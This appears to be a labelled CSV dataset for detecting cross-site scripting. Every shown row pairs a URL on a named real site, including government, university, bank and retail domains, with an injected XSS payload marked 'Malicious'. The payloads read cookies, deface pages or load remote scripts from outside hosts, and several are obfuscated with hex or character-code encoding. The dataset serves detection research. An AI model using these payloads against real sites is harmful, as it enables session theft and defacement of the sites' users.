Payloads,Class
http://gestiona.madrid.org/cafo_web/run/j/planformativo.icm?dsp=%22%3e%3cscript%3ealert(document.coo<br>kie)%3c/script%3e,Malicious
http://www.bim.yildiz.edu.tr/support/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr<br>.com/chat/c.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(d<br>ocument.cookie);&lt;/script&gt;&lt;script&gt;alert(/kabus/);&lt;/script&gt;,Malicious
"http://soc.jpl.nasa.gov/members-country.cfm?country=';alert(string.fromcharcode(83,69,67,85,82,73,84<br>,89,32,83,85,88))//\';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//%22;alert(str<br>ing.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(string.fromcharcode(83,69,67,85,8<br>2,73,84,89,32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(83,69,67<br>,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://www.hrol.cn/xxkd/show.php?id=%27%27%27%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script%3e,Malicious
"http://bg.888.com/new888/home.htm?lang=bg'%22--%3e%3c/style%3e%3c/script%3e%3cscript%3ealert(string.fromcharcode(66,101,115,116,32,114,101,103,97,114,100,115,32,102,114,111,109,32,66,117,108,103,97,114,105,97))%3c/script%3e'%22%3e%3cscript%3edocument.body.innerhtml=%22%3cstyle%3ebody{visibility:hidden;%20background:black;}%3c/style%3e%3cdiv%20style=visibility:visible;%3e%3ccenter%3e%3ch1%3e%3cfont%20color='white'%3eplease%20fix%20your%20%3c/font%3e%3cfont%20color='red'%3e%20xss%20%3c/font%3e%3cfont%20color='white'%3e!%3c/font%3e%3c/h1%3e%3cfont%20color='white'%3ebest%20regards%20from%20bulgaria!%3ch1%3e%3cfont%20color='red'%3e%20%20flexxpoint%3c/font%3e%3c/h1%3e%3cbr%3e%22;%3c/script%3e&s=794749718861938843&os=794749718861938843&sr=480048&osr=480048&flag=no&un=true&l=&st=0&bc=123&anid=0&ic=28&se=611860&isus=false&istur=false&isau=false%a4cy=eur&osadcampaign=&page=main&iframe=yes",Malicious
http://www.yenigece.com/odeme.asp?defurunid=%22%3e%3cscript%3ealert(%22document.cookie%22)%3c/script<br>%3e,Malicious
https://publications.univ-st-etienne.fr/category.php?id_collection=35/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious
http://www.free-host-directory.com/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/script<br>&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.schirmer.com/default.aspx?tabid=2428&amp;state_2889=1&amp;searchtype_2889=all&amp;searchtext_2889=%22<br>%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.sharif.edu/4all/archive/fa-showarch.jsp?arch=1%22/%3e%3cscript%3ealert%28/securitylab.ir/<br>%29%3c/script%3e,Malicious
http://stern.de/search/index.html?stern=1&amp;guj=1&amp;category=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;q=&quot;&gt;&lt;script&gt;ale<br>rt(1)&lt;/script&gt;,Malicious
http://www.topbiz.ro/cauta.php?q=&lt;h1&gt;&lt;marquee&gt;the_0nur%20was%20here&lt;/marquee&gt;&lt;/h1&gt;&lt;script&gt;alert(&quot;0nu<br>r%20was%20here&quot;)&lt;/script&gt;,Malicious
http://ca.eshop.sonyericsson.com/advanced_search_result.php?keywords=&quot;/&gt;&lt;script&gt;alert(/xss:<br>vijayendra/)&lt;/script&gt;&amp;x=20&amp;y=10,Malicious
http://www.tbilliards.com/photogallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://elections.utah.gov/voterregistrationnewhow.html=%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://www.allocine.fr/recherche/?rub=0&amp;motcle=%22%3e%27%3e%3cscript%3ealert%28123%29%3c%2fscript%3e<br>%22%27&amp;x=29&amp;y=19,Malicious
http://www.gpo.gov.il/scripts/topsrch/topapi.dll?mfcisapicommand=issues&amp;mfclang=e1&amp;mthod=smple&amp;initx<br>t=101111150001111110111000000000000000000000000000&amp;ddline1=kw&amp;line1=%3cimg+src%3da.jpg+onerror%3d%27<br>document.write%28%22%3cbody+bgcolor%3d%23000000%3e%3ccenter%3e%3cbr%3e%3cbr%3e%3cimg+src%3dhttp%3a%2<br>f%2fimg165.imageshack.us%2fimg165%2f2420%2frsecurexssverdictdu0.png%3e%3c%2fbody%3e%22%29%27%3e&amp;bro1<br>.x=0&amp;bro1.y=0,Malicious
http://www.downloads.de/download_dl.php?id=710&amp;tabelle=\%22%3e%3cscript%3ealert(document.cookie)%3c/<br>script%3e&amp;n=0,Malicious
http://www.boots.com/guidedsearch/newsearch.jsp?searcharea=1&amp;searchterm=&quot;&gt;&lt;script&gt;alert('s0m.ph');&lt;/<br>script&gt;&amp;go.x=0&amp;go.y=0&amp;uri=%2fguidedsearch%2fnewsearch.jsp&amp;classificationid=&amp;contentid=&amp;articleid=&amp;n=<br>0&amp;ntk=all&amp;nty=1,Malicious
http://www.muzeumgazownictwa.pl/main.php?title=1%22%3e%3c/embed%3e%3cscript%3ealert(1);%3c/script%3e,Malicious
http://sitl.diputados.gob.mx/lxi_leg/curricula.php?dipt=&quot;&gt;&lt;script&gt;alert(/xssed by<br>ar3sw0rmed/);&lt;/script&gt;,Malicious
http://www.orgfree.com/cgi-bin/amanager.cgi?login=%22%3e%3cbody%20onload=alert(%22starext%22)%3e,Malicious
http://www.songchangui.jp/board/?tab=5&amp;tabs=2&amp;mode=view%22%3e%3cscript%3ealert%28/xss/%29%3c/script%<br>3e&amp;idx=145&amp;returnurl=\,Malicious
http://cityguide.nyjournalnews.com/fe/calendarnew/search.asp?selectedeventsection=&quot;&gt;&lt;script&gt;alert(&quot;m<br>axwel&quot;)&lt;/script&gt;,Malicious
http://shadow-webservice.com/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>ackdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://www.petacatalog.org/searchprods.asp?txtsearch=%3e%3c%2ftitle%3e%3c%2fscript%3e%3cscript%3eal<br>ert%281%29%3c%2fscript%3e+onmouseover%3dalert%281%29+onmouseover%3dalert%281%29&amp;productsearchby=2&amp;su<br>bmit=go,Malicious
http://www.opic.gov/leaving.asp?url=%3e%22%3e%3cscript%3ealert('norehem%20was%20here!!')%3c/script%3<br>e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20here%3c/marquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%<br>3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3e%<br>3c/center%3e%3ciframe%20src=http://jersain.iespana.es/xss.html%20%3c,Malicious
http://www.mercadolivre.com.br/brasil/ml/l_user.main?as_filtro_id=certified_usr&as_nickname=%a0&as_pcia_id=%3e%22%3e%3cscript%3ealert%28%27xss%27%29;%3c/script%3e,Malicious
http://yavoy.movistar.es/rbtweb/buscar.jsp?t=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://pouvoirslocaux.wallonie.be/jahia/jahia/enginename/search/pid/2?search=%22%27%2f%3e%3cscript%3<br>ealert%28%27hello+the+rat%27%29%3c%2fscript%3e&amp;maxpageitems=10&amp;pagesearchresultbuilder.onlyonehitbyp<br>age=false&amp;searchview=simple&amp;freesearch=&amp;searchhandler=search&amp;go=rechercher,Malicious
http://ask.jp/blog.asp?o=%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2866%2c121%2c32%2c107%2<br>c117%2c115%2c111%2c109%2c105%2c115%2c111%2c46%2c99%2c111%2c109%29%29%3c%2fscript%3e%0d%0a&amp;qsrc=96&amp;q=<br>link%3ahttp%3a%2f%2fwww.youtube.com%2fwatch%3fv%3dqvsgrwqgvl0&amp;btnblg.x=0&amp;btnblg.y=0&amp;hq=,Malicious
http://www.silicon.de/enid/mein_silicon?username=%22%3e%3cscript%3ealert(1);%3c/script%3e,Malicious
http://www.legbrien.com/v2/mods.php?go=news&amp;p=dn&amp;news_id=4%22%3e%3cstyle%3ebody{background-color:bla<br>ck;color:white;font:50px%20arial;}%3c/style%3e%3ch1%3eby%20st@rext%3e%3cmarquee%3ewhitehat+forever+b<br>y%20st@rext%3c%2f%3cscript%3ealert(document.cookie)%3c/script%3e%3cbody%20onload=alert(/xssed/)%3e,Malicious
http://dsl.vodafone.de/hilfe/download.php?fileurl=%22%3e%3cscript%3ealert%28document.cookie%29;%3c/s<br>cript%3e,Malicious
"http://epoca.globo.com/fale/ep_fale.asp?titulo=&lt;script&gt;alert(string.fromcharcode(88,83,83,32,98,121,<br>32,66,117,103,66,117,115,116,101,114,32,45,32,76,101,105,97,32,98,117,103,98,117,115,116,101,114,46,<br>99,111,109,46,98,114));&lt;/script&gt;",Malicious
http://pharmacy.lhfa.la.gov/index.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3<br>e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.romanarmy.nl/rat/cal_lite.php?id=12&amp;mode=display&amp;cl_d=%3cscript%3ealert(document.cookie)%<br>3c/script%3e&amp;cl_m=11&amp;cl_y=2008,Malicious
https://support.apple.com/macbookpro15/batteryexchange/index.html?lang=ja'%3e%22%3e%3cscript/src=htt<br>p://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.bowlingforcash.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/sc<br>ript%3e,Malicious
http://benq.nl/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+nar<br>coticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://benq.fr/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+nar<br>coticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://dept.kent.edu/pas/shopcustadmin.asp?msg=%3cscript%3ealert('by%20codes%201923turk%20grup');%3c<br>/script%3e,Malicious
http://www.giosites.com/igallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.misco.co.uk/applications/searchtools/search.asp?keywords=%22%3e%3c%73%63%72%69%70%74%3e%6<br>1%6c%65%72%74%28%22%41%6d%61%7a%65%64%3f%20%2d%20%53%74%75%61%72%74%79%22%29%3c%2f%73%63%72%69%70%74<br>%3e&amp;image1.x=0&amp;image1.y=0,Malicious
http://www.wilayahnetwork.com/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://sitesearch.websidestory.com/?q=xss+holes%3cscript%3ealert%28%22xss%22%29%3c%2fscript%3e&amp;x=0&amp;y<br>=0,Malicious
http://sourceforge.net/community/?s=search+community%22%3e%27%3e%3cscript%3ealert%28123%29%3c%2fscri<br>pt%3e%22%27,Malicious
http://www.buenosaires.gov.ar/areas/turismo/servicios/index.php?lang=es=%22%3e%3ciframe%20src=http:/<br>/www.google.com/%3e%3c/iframe%3e,Malicious
http://www.arcadetown.com/scripts/show_hiscore.asp?gameid=%3cscript%3ealert(document.cookie);%3c/scr<br>ipt%3e,Malicious
http://www.mcli.dist.maricopa.edu/mlx/empty.php?item=2102%22%3e%3cscript%3ealert(1337)%3c/script%3e%<br>22%3e%3cscript%3ealert(%22xss%20by%20\nxylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.oekotest.de/cgi/ot/otg.cgi?search=thema&amp;suchtext=totalschaden&quot;&gt;&lt;script&gt;alert(&quot;test test<br>test - totalschaden&quot;)&lt;/script&gt;&amp;bernr=&amp;x=0&amp;y=0,Malicious
http://www.ardehome.com/scripts/kayit.asp?id=3558&amp;dil=tr&amp;page=grup.asp&amp;results=&quot;&gt;&lt;script&gt;alert(docum<br>ent.cookie)&lt;/script&gt;,Malicious
http://find.yuku.com/find/profiles/?q=%22%3e%3cscript%3ealert%28123%29%3c%2fscript%3e,Malicious
http://www.forestrights.gov.in/committeereport/report.jsp?cl=1&amp;&amp;drpdistrict=89&amp;&amp;page=1&quot;&gt;&gt;&lt;/script&gt;&lt;s<br>cript&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.belfasttelegraph.co.uk/search/simple.do;jsessionid=d94e09cfce6897a946cdf6146c5b2c29ee5149<br>ce4c6.e3mka3yqan8qe38ka3mpc34qahr0n6jamljgr5xdqqlvpae?publicationid=105953&amp;includesectionid=942&amp;succ<br>essurl=http%3a%2f%2fwww.belfasttelegraph.co.uk%2fsearch%2findex.jsp%3fmode%3dresult&amp;searchenginename<br>=lucysearch1&amp;includesubsections=true&amp;pagelength=25&amp;articletype=news&amp;sortstring=score&amp;maxrows=500&amp;sea<br>rchstring=%22%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%41%6d%61%7a%65%64%3f%20%2d%20%53%74%75<br>%61%72%74%79%22%29%3c%2f%73%63%72%69%70%74%3e&amp;from=3+months&amp;submitquicksearch=go,Malicious
http://www.megaclick.com/search/?q=%22%3e%3cscript%3ealert%28123%29%3c%2fscript%3e,Malicious
http://www.turkeyhack.org/downloads.php?do=cat&amp;id=1%22%3e%3cscript%3ealert(%22critia!!%20vbulletin%2<br>0xssed%20\ncookie%20editor%22)%3c/script%3e,Malicious
http://foggia.bakeca.it/tutte-le-categorie-0?%22%3c/script%3e%3cscript%3ealert(document.cookie);%3c/<br>script%3e%3cscript%3e,Malicious
http://www.edega.com/index.php?tema=produkcija&amp;lnid=%22%3cscript%3ealert(document.cookie);%3c/script<br>%3e&amp;produkcija=edega_kiti_produktai,Malicious
http://www.nanabellesgifts.com/shop/search.asp?searchtext=%22%3e%27%3e%3cscript%3ealert(123)%3c%2fsc<br>ript%3e&amp;searchbutton.x=0&amp;searchbutton.y=0,Malicious
http://www.globalgateway.com/search.asp?criteria=%3cscript%3ealert%28document.cookie%29%3b%3c%2fscri<br>pt%3e,Malicious
http://www.congress.org/congressorg/directory/search_results.tt?action=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/sc<br>ript&gt;,Malicious
http://www.idahorosesociety.org/irsphotogallery/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)<br>&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.downlinestarter.com/members.php?id=1370%22%3e%3cscript%3ealert%28document.cookie%29%3c/sc<br>ript%3e,Malicious
http://www.dci.com.br/usexibir_pagina.asp?sxml=primeira_pagina&amp;title=&lt;script&gt;alert(&quot;scriptorium(turk<br>ey)&quot;)&lt;/script&gt;,Malicious
http://www.hotornot.com/popup/share.html?eid=nqelheg&amp;key=xaq&amp;source=&gt;&lt;script&gt;alert(document.cookie);<br>&lt;/script&gt;,Malicious
http://gti-web.mcafee.com/api/index.php/api?dataset=topmalware&amp;page=1&amp;rows=10&amp;format=js&amp;callback=&lt;if<br>rame src='http://xssed.com',Malicious
"http://tags.library.upenn.edu/%22%3e%3cscript%3ealert(string.fromcharcode(115,101,121,109,101,110))%<br>3c/script%3e",Malicious
http://gencyorum.com/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://pkgsrc.se/search.php?so=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c%2fscript%3e,Malicious
http://www.leadershipdevelopment.co.uk/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://www.clickbank.com/webchat/email/offline-mail.jsp?workgroup=%22%3e%3cscript%3ealert%28/securi<br>tylab.ir/%29%3c/script%3e,Malicious
https://bankingportal.sparkasse-arnsberg-sundern.de/banking/?konto=%22%3e%3ciframe%20src=http://www.<br>google.de%3e,Malicious
http://www.fifi.org/cgi-bin/man2html?radiobutton+3%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/sc<br>ript%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
"http://store.samsung.com/uk/camera/smart-n2x""><script>alert(document.cookie)</script></nx1010-smart-camera/p/ed-lf52pl",Malicious
http://b.xmbs.jp/b.php?id=kyoufu&amp;c_num=63525'%3e%22%3e%3cscript/src=http://kusomiso.com/x.js%3e%3c/s<br>cript%3e&amp;disp=1,Malicious
http://www.vatican.va/redemptoris_mater/flash/index.html?lingua=it%22----%3e%3e''%3e%3cscript%3ealert('xss')%3c/script%3e,Malicious
http://www.bernieloehn.de/webcards/tools/calendar.php?month=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;,Malicious
http://just-ping.com/index.php?vh=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e&amp;s=ping%21,Malicious
http://fileshunt.com/?q=xy%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%<br>3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3elitol&amp;ftype=0%27%22%3e%3c/title%3e%3cscript%3ealert(<br>1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://admin.yintai.gov.cn/info.php?cx[][][][][][][][][][][][][][][][][][]=%22%3e%3cscript%3ealert(d<br>ocument.cookie)%3c/script%3e,Malicious
http://cgi.din.or.jp/~tabito/diary/board.cgi?act=write&amp;diary=200709201'%3e%22%3e'%3e%3cscript%3ealer<br>t(%22xss%20by%20kusomiso.com%22)%3c/script%3e,Malicious
http://bfo.pmang.com/index.nwz?mkey=5&amp;skey=%22%3e%3cscript%20%0a%0d%3ealert(%22xss%20by%20d3vbit3%22<br>);%3c/script%3e,Malicious
http://www.akaypaintball.com/tr/goster_urun_resim.asp?urunresim=%22%3e%3c/script%3e%3cscript%3ealert<br>(12)%3c/script%3e,Malicious
http://www.cardomain.com/login?request_uri=http://groups.cardomain.com/groups/new?resume=%22%3e%3csc<br>ript%3ealert(/xss/)%3c/script%3e,Malicious
https://www2.dpf.gov.br/gru/gru?nac=1%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://locoboard.net/delete.php?id=vip&amp;no='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/s<br>cript%3e,Malicious
http://search.39.net/result.aspx?words=%22%3e%3cmarquee%3edefaced%20by%20sponsfull%3c/marquee%3e,Malicious
http://www.advtechind.com/result.asp?search_title=product+name&amp;radiobutton=rb1&amp;search_txt=cl%22%3e%3<br>cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.bme.jhu.edu/people/primary.php?id=393%27%3cscript%3ealert(1337)%3c/script%3e,Malicious
http://www.e-tf.rs.gov.br/busca/busca_chave.php?busca=%27%3balert%28string.fromcharcode%2883%2c69%2c<br>67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%5c%27%3balert%28string.fromcharcode%2883<br>%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%22%3balert%28string.fromcharcode<br>%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%5c%22%3balert%28string.from<br>charcode%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f--%3e%3c%2fscript%3e<br>%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c8<br>3%2c85%2c88%29%29%3c%2fscript%3e&amp;x=16&amp;y=12,Malicious
http://library.gordontafe.edu.au/05_select_subjects/01_subjects_a-z.cfm?tcol=&quot;&gt;&lt;script&gt;alert(&quot;maxwel<br>&quot;)&lt;/script&gt;,Malicious
http://www.anneliesefuerfrankfurt.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.thespinningimage.co.uk/cultfilms/displaycultfilm.asp?reviewid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/<br>script&gt;,Malicious
http://www.gutimbett.ch/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdo<br>or&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.brazilianfightwear.com/store/admin/include/errorwindow.asp?lng=english&amp;message_id=5&amp;messa<br>ge_add=%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://www.bibliotecas.cm-amadora.pt/docbweb/plinkres.asp?base=isbd&amp;form=&amp;startrec=0&amp;recpag=5&amp;newsea<br>rch=1&amp;searchtxt=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www2.itapemirim.com.br/fidelidade/itapemirim/login.asp?referer=resgate.asp&amp;title=&lt;script&gt;aler<br>t(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;,Malicious
http://wdfw.wa.gov/fish/ans/identify/search.php?searchby=speciesfamilycategory&amp;search=&quot;&gt;&lt;/a&gt;&lt;script&gt;<br>alert(document.cookie);&lt;/script&gt;,Malicious
http://www.starbucksstore.com/products/shprodli.asp?keywords=%3c%2ftitle%3e%3cscript%3ealert%28%27xs<br>sed%27%29%3b%3c%2fscript%3e,Malicious
http://www.tarbazlim.com/fotogaleri/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.essex-fire.gov.uk/pages/search.asp?keyword=%22%3cscript+src%3dhttp://vuln.xssed.net/third<br>party/scripts/hotpockets.js%3e,Malicious
http://bernalingenuity.com/gallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.culture-buzz.cn/spip.php?action=cookie&amp;url=java:%22/%3cscript%3ealert('hello%20the%20rat'<br>)%3c/script%3e,Malicious
"http://www.gametrailers.com/search.php?s=';alert(string.fromcharcode(88,83,83))//\';alert(string.fro<br>mcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88,83<br>,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
http://www.safety-lab.com/en/order.php?o=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert%281337%29%3c%2fscr<br>ipt%3e%3e%3cmarquee%3e%3ch1%3exss+by+rohit%3c%2fh1%3e%3c%2fmarquee%3e&amp;v=14&amp;lang=en&amp;action=frommasthe<br>ad&amp;resetcriteria=y&amp;cc=us&amp;search.x=28&amp;search.y=16&amp;search=search,Malicious
http://cms.bbb.org/wwwroot/search.aspx?site=0&amp;s=xss%22%3e%3cscript%3ealert%28document.cookie%29%3c/s<br>cript%3e,Malicious
http://www.totalchoicehosting.com/help/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/s<br>cript%3e,Malicious
http://www.kurucasile.bel.tr/galeri/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.combust.cn/cgi-bin/loginout.cgi?forum=71%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%<br>74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%3<br>0%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c<br>%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://ms135.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://tw.boincstats.com/bam/register.php?email=%22%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e&amp;name=%22%3e<br>%3ch1%3eby%20kusomiso.com%3c/h1%3e,Malicious
http://www.eco-navi.com/php/serch.php?textfield='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3<br>e%3c/script%3e,Malicious
http://www.vodafone.com.tr/vodafoneroaming/prepaid_dolasim_ortaklari.php?ulke=2&amp;ulkeisim=%22%3e%3csc<br>ript%3ealert(1)%3c/script%3e,Malicious
http://www.instructables.com/id/how-to-conduct-a-social-experiment-on-webcam-or-s//email?id=%22/%3e%<br>3ciframe%20src=http://google.com%3e%3c/iframe%3e%3cscript%20src=http://ha.ckers.org/xss.js?/%3e,Malicious
http://www.kplusk.org/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;back<br>door&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.hbeu1.hsbc.com/ukservices/branchlocator/town.asp?town=679&amp;type=&quot;&gt;&lt;script&gt;alert(&quot;daimon&quot;)&lt;<br>/script&gt;,Malicious
